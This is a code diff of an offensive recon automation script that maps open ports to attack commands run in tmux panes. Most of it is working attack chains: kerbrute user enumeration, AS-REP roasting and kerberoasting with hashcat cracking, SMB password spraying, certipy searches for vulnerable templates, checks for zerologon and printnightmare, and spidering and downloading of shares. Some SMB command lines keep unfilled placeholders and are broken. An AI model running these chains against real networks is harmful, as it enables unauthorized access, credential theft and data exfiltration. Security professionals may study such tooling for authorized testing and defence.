@@ -1,11 +1,13 @@
-from impacket.ldap.ldap import LDAPConnection
-import libtmux
 from time import sleep
 
+import libtmux
+
 from utils.logger import write_log
-from utils.smb import enumerate_smb_shares
+from recon_setup.utils.active_directory import enum_smb_shares, anonymous_bind
+
 
 SPRAYABLE_PORTS = {21: "ftp", 22: "ssh", 135: "wmi", 389: "ldap", 445: "smb", 1433: "mssql", 3389: "rdp", 5900: "vnc", 5985: "winrm"}
+
 
 class PortHandlerRegistry:
     def __init__(self):
@@ -18,7 +20,9 @@ class PortHandlerRegistry:
             return func
         return decorator
 
+
 port_registry = PortHandlerRegistry()
+
 
 def handle_task(context, port):
     """Main entry point for port handling"""
@@ -28,6 +32,7 @@ def handle_task(context, port):
     if port in port_registry.port_handlers:
         for task_handler in port_registry.port_handlers[port]:
             task_handler(context)
+
 
 def run_task(context, command):
     target_pane = prepare_task_pane(context)
@@ -41,10 +46,12 @@ def run_task(context, command):
     else:
         write_log(context.log_file, f"Failed to create pane for task: {command}")
 
+
 def stage_task(context, command):
     target_pane = prepare_task_pane(context)
     if target_pane:
         target_pane.send_keys(command, enter=False)
+
 
 def prepare_task_pane(context):
     if (context.current_task_window is None or context.current_task_pane > 5):
@@ -74,9 +81,11 @@ def prepare_task_pane(context):
         return target_pane
     return None
 
+
 # @port_registry.register_port_handler()
 # def proto_tasks(context):
 #     run_task(context, f"")
+
 
 @port_registry.register_port_handler(21)
 def proto_tasks(context):
@@ -87,9 +96,11 @@ def proto_tasks(context):
     else:
         run_task(context, f"nxc ftp {context.ip} -u '' -p '' --ls")
 
+
 @port_registry.register_port_handler(53)
 def dns_tasks(context):
     run_task(context, f"dig @{context.ip} -x {context.ip} +short; dig axfr @{context.ip} {context.domain}")
+
 
 @port_registry.register_port_handler(80)
 def http_tasks(context):
@@ -101,6 +112,7 @@ def http_tasks(context):
         run_task(context, f"firefox 'http://{target}' &> /dev/null & disown; ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -u http://{target}/FUZZ -ac -c; ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://{target}/FUZZ -ac -c; feroxbuster -u http://{target}")
     run_task(context, f"wpscan --no-update --url http://{target} --detection-mode aggressive -e ap,u; wpscan --no-update --url http://{target} --detection-mode aggressive -e ap,u --plugins-detection aggressive -o wpscan_long.out")
 
+
 @port_registry.register_port_handler(88)
 def kerberos_tasks(context):
     if context.domain:
@@ -109,9 +121,11 @@ def kerberos_tasks(context):
             run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" getTGT.py {context.domain}/{user}:'{passwd}'")
         run_task(context, f"kerbrute userenum -d {context.domain} --dc {context.ip} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt")
 
+
 @port_registry.register_port_handler(135)
 def proto_tasks(context):
     run_task(context, f"echo querydominfo | rpcclient {context.ip}; echo querydominfo | rpcclient -U '' -N {context.ip}")
+
 
 @port_registry.register_port_handler(389)
 def ldap_tasks(context):
@@ -123,31 +137,29 @@ def ldap_tasks(context):
         run_task(context, f"certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -timeout 2 -enabled; certipy find -u {user}@{context.domain} -p '{passwd}' -k -target {target} -dc-ip {context.ip} -stdout -timeout 2 -vulnerable; powerview {context.domain}/{user}:'{passwd}'@{context.ip} --web")
         run_task(context, "neo4j start; sleep 5; bloodhound &> /dev/null & disown")
     else:
-        try:
-            # Check anonymous bind
-            conn = LDAPConnection(f"ldap://{context.domain}", f"{context.ip}")
-            conn.login()
-            conn.search('', searchFilter="(userAccountControl:1.2.840.113556.1.4.803:=8192)", attributes=['objectSid'])
+        if anonymous_bind():
             write_log(context.log_file, f"LDAP anonymous bind is enabled", "SUCCESS")
             run_task(context, f"nxc ldap {target} -u '' -p '' --asreproast hashes.asreproast --kerberoasting hashes.kerberoast --find-delegation --trusted-for-delegation --password-not-required --users --groups --dc-list --gmsa; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
             run_task(context, f"powerview {target}")
-        except Exception as e:
-            return
+
 
 @port_registry.register_port_handler(443)
 def proto_tasks(context):
     fqdn = context.vhost or context.domain or context.ip
     run_task(context, f"firefox 'https://{fqdn}' &> /dev/null & disown; curl -Ik https://{fqdn}")
 
+
 @port_registry.register_port_handler(445)
 def smb_tasks(context):
     if context.creds_exist():
         user, passwd = context.get_initial_cred()
+        run_task(context, f"aliasr scan {context.ip} -u {user} -p {passwd}")
         run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p '{passwd}' -k --pass-pol --shares; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb <ip> -u <user> -<auth|p> <passwd> -k -M timeroast; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb <ip> -u <user> -<auth|p> <passwd> -k -M webdav -M spooler -M ioxidresolver -M gpp_autologin -M gpp_password -M ms17-010 -M nopac -M remove-mic -M smbghost -M zerologon -M enum_ca -M aws-credentials -M coerce_plus; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb <ip> -u <user> -<auth|p> <passwd> -k -M printnightmare")
         run_task(context, f"faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u {user} -p '{passwd}' -k --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out; cat smb.out | grep TypeUser | cut -d '\\' -f 2 | cut -d ' ' -f 1 > users.txt; echo; cat users.txt; echo")
     else:
+        run_task(context, f"aliasr scan {context.ip}")
         run_task(context, f"nxc smb {context.ip} -u '' -p '' --shares --users --pass-pol --rid-brute 10000 --log $(pwd)/smb.out; nxc smb {context.ip} -u 'a' -p '' --rid-brute 10000 --log $(pwd)/smb.out; cat smb.out | grep TypeUser | cut -d '\\' -f 2 | cut -d ' ' -f 1 > users.txt; echo; cat users.txt; echo; faketime \"$(rdate -n {context.ip} -p | awk '{{print $2, $3, $4}}' | date -f - \"+%Y-%m-%d %H:%M:%S\")\" nxc smb {context.ip} -u users.txt -p users.txt -k --no-bruteforce --continue-on-success; nxc smb {context.ip} -u users.txt -p '' --continue-on-success")
-    shares, method = enumerate_smb_shares(context)
+    shares, method = enum_smb_shares(context)
     if shares:
         for share in shares:
             if share['name'] not in ['ADMIN$', 'C$', 'Users', 'IPC$', 'NETLOGON', 'SYSVOL']:
@@ -160,6 +172,7 @@ def smb_tasks(context):
                     run_task(context, f"nxc smb {context.ip} -u 'a' -p '' --spider '{share['name']}' --regex . --depth 2; nxc smb {context.ip} -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True EXCLUDE_EXTS=ico,lnk,svg,js,css,scss,map,png,jpg,html,npmignore EXCLUDE_FILTER=ADMIN$,C$,Users,IPC$,NETLOGON,SYSVOL,bootstrap,lang OUTPUT_FOLDER=.; cat {context.ip}.json | jq '. | map_values(keys)'; smbclientng --host {context.ip} -d {context.domain} -u a -p ''")
             if 'WRITE' in share['access']:
                 write_log(context.log_file, f"Found writeable share: {share['name']} ({', '.join(share['access'])} privileges)", "SUCCESS")
+
 
 @port_registry.register_port_handler(2049)
 def proto_tasks(context):
